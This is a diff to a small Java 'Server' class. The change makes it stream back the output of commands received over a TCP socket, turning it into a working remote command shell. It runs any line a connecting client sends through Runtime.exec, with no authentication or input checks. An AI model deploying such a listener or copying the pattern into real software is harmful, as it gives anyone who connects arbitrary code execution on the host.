@@ -1,19 +1,19 @@
-import java.io.ObjectOutputStream;
-import java.io.InputStreamReader;
-import java.io.BufferedReader;
+import java.io.*;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.ServerSocket;
-class Server
+class Server implements Serializable
 {
   Socket s;
   ServerSocket ss;
   BufferedReader in,reader;
   String o,c_Ip;
-  //String line = "";
+  String line = "";
   Process process;
   InetSocketAddress socketAddress;
-  ObjectOutputStream out;
+
+  PrintWriter pw;
+
   Server(int port) throws Exception
   {
     ss = new ServerSocket(port);
@@ -22,7 +22,7 @@ class Server
     c_Ip = socketAddress.getAddress().getHostAddress();
     System.out.println("CONNECTED TO : "+ c_Ip);
     in = new BufferedReader(new InputStreamReader(s.getInputStream()));
-    out = new ObjectOutputStream(s.getOutputStream());
+    pw = new PrintWriter(s.getOutputStream(),true);
     while(true)
     {
       o = in.readLine();
@@ -32,13 +32,16 @@ class Server
       }
       process = Runtime.getRuntime().exec(o.trim());
       reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-      out.writeObject(reader);
-      /*while ((line = reader.readLine()) != null)
+      while ((line = reader.readLine()) != null)
       {
-        System.out.println(line);
-      }*/
+        pw.println(line);
+      }
+      pw.flush();
+      reader.close();
     }
+    pw.close();
     s.close();
+    ss.close();
     in.close();
   }
   public static void main(String[] args) throws Exception
